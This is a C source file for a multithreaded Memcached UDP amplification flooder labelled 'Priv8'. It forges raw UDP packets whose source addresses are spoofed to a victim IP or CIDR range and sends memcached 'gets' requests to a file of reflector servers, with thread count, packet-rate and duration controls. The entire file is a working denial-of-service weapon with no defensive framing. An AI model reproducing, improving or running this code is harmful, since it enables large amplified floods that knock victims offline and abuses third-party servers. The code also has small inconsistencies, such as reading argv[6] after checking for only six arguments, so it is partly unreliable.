/*
 * Priv8 Priv8 Priv8 Priv8 Priv8 Priv8
 */
#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9

// CMWC random number generator state
static uint32_t Q[4096], c = 362436;

// Linked list node for storing reflector IP addresses
struct list
{
    struct sockaddr_in data;
    struct list *next;
    struct list *prev;
};

// Global head for the reflector IP list (from reflection file)
struct list *reflector_head;

volatile int tehport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

// Structure to pass data to each flood thread
struct thread_data{
    int thread_id;
    struct list *reflector_list_node; // Starting node for reflector list
    unsigned int start_ip_ui;         // Start IP of the target CIDR range (network byte order)
    unsigned int end_ip_ui;           // End IP of the target CIDR range (network byte order)
    unsigned int current_ip_ui;       // Current IP being used by this thread (network byte order)
};

// Define the Memcached request payload and its size.
// Using a simple "get k\r\n" which is 7 bytes.
// Replace "k" with a key known to store a large value on reflector servers for maximum amplification.
static const char MEMCACHE_REQUEST_PAYLOAD[] = "\0\x01\0\0\0\x01\0\0gets a b c d e f g h j k l m n o p q r s t w v u x y a 1 2 3 4 5 6 7 8 9 0\r\n";
static const int MEMCACHE_REQUEST_PAYLOAD_SIZE = sizeof(MEMCACHE_REQUEST_PAYLOAD) - 1; // Exclude null terminator


/**
 * @brief Initializes the CMWC random number generator.
 * @param x Seed value.
 */
void init_rand(uint32_t x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
    {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

/**
 * @brief Generates a random 32-bit unsigned integer using CMWC.
 * @return A random 32-bit unsigned integer.
 */
uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

/**
 * @brief Calculates the Internet checksum.
 * @param buf Pointer to the buffer.
 * @param nwords Number of 16-bit words in the buffer.
 * @return The calculated checksum.
 */
unsigned short csum (unsigned short *buf, int nwords)
{
    unsigned long sum = 0;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

/**
 * @brief Sets up the IP header.
 * @param iph Pointer to the IP header structure.
 */
void setup_ip_header(struct iphdr *iph)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    // Total length: IP header + UDP header + new data payload size
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + MEMCACHE_REQUEST_PAYLOAD_SIZE;
    iph->id = htonl(54321); // Random ID for fragmentation
    iph->frag_off = 0;      // No fragmentation
    iph->ttl = MAXTTL;      // Time to live
    iph->protocol = IPPROTO_UDP; // Protocol is UDP
    iph->check = 0;         // Checksum calculated later
    // Source and destination IPs will be set by the flood thread
}

/**
 * @brief Sets up the UDP header and payload.
 * @param udph Pointer to the UDP header structure.
 */
void setup_udp_header(struct udphdr *udph)
{
    udph->source = htons(5678); // Arbitrary source port
    udph->dest = htons(11211);  // Default Memcache port
    udph->check = 0;            // Checksum calculated later

    memcpy((void *)udph + sizeof(struct udphdr), MEMCACHE_REQUEST_PAYLOAD, MEMCACHE_REQUEST_PAYLOAD_SIZE);
    udph->len=htons(sizeof(struct udphdr) + MEMCACHE_REQUEST_PAYLOAD_SIZE); // UDP length: header + payload
}

/**
 * @brief Converts an IP address string to an unsigned integer.
 * @param ip_str The IP address string (e.g., "192.168.1.1").
 * @return The IP address as an unsigned integer in network byte order.
 */
unsigned int ip2ui(const char* ip_str) {
    return inet_addr(ip_str);
}

/**
 * @brief Converts an IP address unsigned integer to a string.
 * @param ip_val The IP address as an unsigned integer in network byte order.
 * @return A static buffer containing the IP address string.
 */
char* ui2ip(unsigned int ip_val) {
    static char ip_buf[INET_ADDRSTRLEN];
    struct in_addr addr;
    addr.s_addr = ip_val;
    return inet_ntoa(addr);
}

/**
 * @brief Creates a netmask for a given number of bits.
 * @param bits The number of bits for the netmask (e.g., 24 for /24).
 * @return The netmask as an unsigned integer in network byte order.
 */
unsigned int createBitmask(unsigned int bits) {
    if (bits >= 32) return 0xFFFFFFFF; // All bits set for /32 or higher (effectively /32)
    if (bits == 0) return 0;           // No bits set for /0
    // Calculate mask: 32 - bits gives the number of host bits. Shift 1 left by host bits, subtract 1, then invert.
    return htonl(~((1U << (32 - bits)) - 1));
}

/**
 * @brief The main flood function executed by each thread.
 * @param par1 Pointer to the thread_data structure.
 */
void *flood(void *par1)
{
    struct thread_data *td = (struct thread_data *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);

    // Get starting list node for reflector list
    struct list *reflector_list_node = td->reflector_list_node;

    // Get CIDR range information and initialize current IP for this thread
    unsigned int current_ip_ui = td->current_ip_ui;
    unsigned int start_ip_ui = td->start_ip_ui;
    unsigned int end_ip_ui = td->end_ip_ui;

    // Create a raw socket for sending UDP packets
    // IPPROTO_UDP is used as we are constructing a UDP packet.
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(s < 0){
        fprintf(stderr, "Thread %d: Could not open raw socket. Ensure you have root privileges.\n", td->thread_id);
        pthread_exit(NULL); // Exit thread on error
    }

    // Initialize random seed for this thread
    init_rand(time(NULL) ^ td->thread_id); // Seed with time and thread ID for variety

    // Zero out the datagram buffer
    memset(datagram, 0, MAX_PACKET_SIZE);

    // Setup IP and UDP headers (common parts)
    setup_ip_header(iph);
    setup_udp_header(udph);

    // Set initial source port (random)
    udph->source = htons(rand() % (65535 - 1024) + 1024); // Random port above 1024

    // Set initial source (target) and destination (reflector) IPs
    iph->saddr = current_ip_ui;
    iph->daddr = reflector_list_node->data.sin_addr.s_addr;

    // Calculate initial IP header checksum
    iph->check = 0; // Must zero before calculating
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

    // Set socket option to include IP header (we are providing it)
    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
        fprintf(stderr, "Thread %d: Error: setsockopt() - Cannot set IP_HDRINCL!\n", td->thread_id);
        pthread_exit(NULL); // Exit thread on error
    }

    register unsigned int i;
    i = 0;
    while(1){
        // Advance to the next target IP within the CIDR range
        current_ip_ui++;
        // If current IP exceeds the end of the range, wrap around to the start
        if (current_ip_ui > end_ip_ui) {
            current_ip_ui = start_ip_ui;
        }

        // Advance to the next reflector IP in its list
        reflector_list_node = reflector_list_node->next;

        // Update IP header with new source (target) and destination (reflector) IPs
        iph->saddr = current_ip_ui;
        iph->daddr = reflector_list_node->data.sin_addr.s_addr;

        // Randomize IP ID for each packet
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);

        // Recalculate IP header checksum since source/destination IPs have changed
        iph->check = 0; // Must zero before calculating
        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

        // Send the crafted packet to the current reflector
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &reflector_list_node->data, sizeof(reflector_list_node->data));

        pps++; // Increment packets per second counter for statistics

        // Apply PPS limiter if enabled
        if(limiter != -1 && i >= limiter)
        {
            i = 0;
            usleep(sleeptime); // Pause for sleeptime microseconds
        }
        i++;
    }
    close(s); // Close socket when thread exits (though it's an infinite loop)
}

/**
 * @brief Main function to set up and start the flooding attack.
 * @param argc Number of command-line arguments.
 * @param argv Array of command-line arguments.
 */
int main(int argc, char *argv[ ])
{
    // Check for correct number of arguments
    if(argc < 6){
        fprintf(stderr, "Invalid parameters!\n");
        fprintf(stdout, "[!] Memcache Amplification. \nUsage: %s <target IP/CIDR> <target port (not used)> <reflection file> <threads> <pps limiter, -1 for no limit> <time in seconds>\n", argv[0]);
        exit(-1);
    }

    srand(time(NULL)); // Seed standard rand for source port generation

    // Initialize global linked list head
    reflector_head = NULL;

    fprintf(stdout, "[!] Preparing attack...\n");

    // Variables to hold the target CIDR range (network byte order)
    unsigned int global_start_ip_ui;
    unsigned int global_end_ip_ui;

    // --- Parse target IP/CIDR (argv[1]) ---
    char *target_arg = argv[1];
    char *slash = strchr(target_arg, '/'); // Look for CIDR slash

    if (slash != NULL) {
        // CIDR format detected (e.g., "192.168.1.0/24")
        *slash = '\0'; // Null-terminate the IP part
        char *ip_str = target_arg;
        unsigned int bits = atoi(slash + 1); // Get CIDR bits

        unsigned int base_ip_ui = ip2ui(ip_str);
        unsigned int netmask = createBitmask(bits);
        global_start_ip_ui = base_ip_ui & netmask; // Network address
        global_end_ip_ui = global_start_ip_ui | (~netmask); // Broadcast address for the range

        // Special handling for /32 (single IP) to ensure the loop runs once for it
        if (bits == 32) {
            global_end_ip_ui = base_ip_ui;
        } else if (bits < 32) {
            // Exclude network and broadcast addresses from the usable range
            // This is typical for host ranges within a CIDR.
            // If the user truly wants to include .0 and .255, this logic would need adjustment.
            global_start_ip_ui = htonl(ntohl(global_start_ip_ui) + 1);
            global_end_ip_ui = htonl(ntohl(global_end_ip_ui) - 1);
            // Handle edge case where incrementing start_ip_ui makes it greater than end_ip_ui
            if (ntohl(global_start_ip_ui) > ntohl(global_end_ip_ui)) {
                fprintf(stderr, "Warning: Usable IP range for /%d block is empty. Using original network/broadcast.\n", bits);
                global_start_ip_ui = base_ip_ui & netmask;
                global_end_ip_ui = global_start_ip_ui | (~netmask);
            }
        }
        
        fprintf(stdout, "[!] Target CIDR: %s/%d (Usable IPs from %s to %s)\n", ip_str, bits, ui2ip(global_start_ip_ui), ui2ip(global_end_ip_ui));
        *slash = '/'; // Restore original string (optional, but good practice)
    } else {
        // Single IP format (no CIDR slash)
        fprintf(stdout, "[!] Target IP: %s\n", target_arg);
        global_start_ip_ui = inet_addr(target_arg);
        global_end_ip_ui = inet_addr(target_arg);
    }

    if (global_start_ip_ui == 0 || global_end_ip_ui == 0) { // inet_addr returns -1 (0xFFFFFFFF) on error
        fprintf(stderr, "Error: Invalid target IP/CIDR '%s'.\n", argv[1]);
        exit(-1);
    }
    // --- End of target IP/CIDR parsing ---

    // --- Parse reflection file (argv[3]) into reflector_head linked list ---
    int max_len = 65; // Max line length for IP addresses in reflection file
    char *buffer = (char *) malloc(max_len);
    if (buffer == NULL) {
        fprintf(stderr, "Error: Memory allocation failed for buffer.\n");
        exit(-1);
    }
    memset(buffer, 0x00, max_len);

    FILE *list_fd = fopen(argv[3], "r");
    if (list_fd == NULL) {
        fprintf(stderr, "Error: Could not open reflection file '%s'. Does it exist?\n", argv[3]);
        free(buffer);
        exit(-1);
    }

    int reflector_count = 0;
    while (fgets(buffer, max_len, list_fd) != NULL) {
        // Remove newline or carriage return characters
        size_t len = strlen(buffer);
        if (len > 0 && (buffer[len - 1] == '\n' || buffer[len - 1] == '\r')) {
            buffer[len - 1] = 0x00;
        }
        if (len > 1 && (buffer[len - 2] == '\r')) { // Handle CRLF
            buffer[len - 2] = 0x00;
        }

        // Skip empty lines
        if (strlen(buffer) == 0) {
            continue;
        }
        
        // Add IP to reflector_head list
        struct list *new_node = (struct list *)malloc(sizeof(struct list));
        if (new_node == NULL) {
            fprintf(stderr, "Error: Memory allocation failed for reflector IP list.\n");
            // Basic cleanup for reflector_head if allocation fails mid-loop
            struct list *current, *temp;
            current = reflector_head;
            if (current != NULL) {
                do {
                    temp = current->next;
                    free(current);
                    current = temp;
                } while (current != reflector_head);
            }
            free(buffer);
            exit(-1);
        }
        memset(new_node, 0x00, sizeof(struct list));
        new_node->data.sin_addr.s_addr = inet_addr(buffer);
        new_node->data.sin_family = AF_INET;
        new_node->data.sin_port = htons(atoi(argv[2])); // Target port for reflector (usually 11211)

        if(reflector_head == NULL) {
            reflector_head = new_node;
            reflector_head->next = reflector_head;
            reflector_head->prev = reflector_head;
        } else {
            new_node->prev = reflector_head->prev;
            new_node->next = reflector_head;
            reflector_head->prev->next = new_node;
            reflector_head->prev = new_node;
        }
        reflector_count++;
    }
    fclose(list_fd);
    free(buffer);

    if (reflector_head == NULL) {
        fprintf(stderr, "Error: No reflector IPs found in file '%s'.\n", argv[3]);
        exit(-1);
    }
    fprintf(stdout, "[!] Loaded %d reflector IPs.\n", reflector_count);
    // --- End of reflection file parsing ---

    // Set up attack parameters
    int num_threads = atoi(argv[4]);
    int maxpps = atoi(argv[5]);
    limiter = (maxpps == -1) ? -1 : maxpps; // -1 for no limit
    pps = 0;
    int attack_duration_seconds = atoi(argv[6]);
    int multiplier = 20; // Used for more frequent PPS checks

    fprintf(stdout, "[!] Starting %d threads for %d seconds...\n", num_threads, attack_duration_seconds);
    if (limiter == -1) {
        fprintf(stdout, "[!] PPS limiter: OFF (no limit).\n");
    } else {
        fprintf(stdout, "[!] PPS limiter: %d pps.\n", limiter);
    }

    pthread_t thread[num_threads];
    struct thread_data td[num_threads];

    // Distribute starting nodes for reflector lists among threads
    struct list *current_reflector = reflector_head; // Start from head for proper distribution

    // Calculate total number of target IPs in the range
    unsigned int total_target_ips = ntohl(global_end_ip_ui) - ntohl(global_start_ip_ui) + 1;
    if (total_target_ips == 0) { // Handle cases like /31, where usable IPs are 0
        total_target_ips = 1; // Ensure at least one IP is considered for the loop
        global_start_ip_ui = inet_addr(target_arg); // Revert to original single IP for /32 or similar
        global_end_ip_ui = inet_addr(target_arg);
    }
    
    for(int i = 0; i < num_threads; i++){
        td[i].thread_id = i;
        td[i].reflector_list_node = current_reflector; // Assign reflector starting node

        // Assign CIDR range to thread data
        td[i].start_ip_ui = global_start_ip_ui;
        td[i].end_ip_ui = global_end_ip_ui;

        // Distribute starting target IPs among threads
        // Each thread starts at an offset within the target IP range
        td[i].current_ip_ui = htonl(ntohl(global_start_ip_ui) + (i % total_target_ips));

        // Create threads
        pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);

        // Move to the next node for the next thread's starting point for reflectors
        current_reflector = current_reflector->next;
    }

    // Main loop for PPS monitoring and adjustment
    long attack_iterations = (long)attack_duration_seconds * multiplier;
    for(long i = 0; i < attack_iterations; i++)
    {
        usleep((1000/multiplier)*1000); // Sleep for 1/multiplier of a second
        if(limiter != -1) { // Only adjust if limiter is active
            if((pps*multiplier) > limiter) // Current PPS is higher than limit
            {
                if(sleeptime < 100000) { // Max sleeptime to prevent too slow
                    sleeptime+=100;
                }
                if(limiter > 1) { // Don't let limiter go below 1
                    limiter--; // Otherwise, reduce the limiter to slow down
                }
            } else { // Current PPS is lower or equal to limit
                limiter++; // Increase limiter to speed up
                if(sleeptime > 25)
                {
                    sleeptime-=25; // Reduce sleeptime
                } else {
                    sleeptime = 0; // Don't go below 0
                }
            }
        }
        // Reset PPS counter for the next interval
        pps = 0;
    }

    fprintf(stdout, "[!] Attack finished.\n");

    // Joining threads is generally good practice to ensure they terminate cleanly,
    // but for infinite attack loops, this might not be reachable.
    // In a real-world scenario, you'd likely want a mechanism to signal threads to exit.
    // for(int i = 0; i < num_threads; i++) {
    //     pthread_cancel(thread[i]); // Or pthread_join, if threads have exit conditions
    // }
    
    // Free allocated memory (basic cleanup for reflector_head)
    struct list *current, *temp;
    current = reflector_head;
    if (current != NULL) {
        do {
            temp = current->next;
            free(current);
            current = temp;
        } while (current != reflector_head);
    }

    return 0;
}
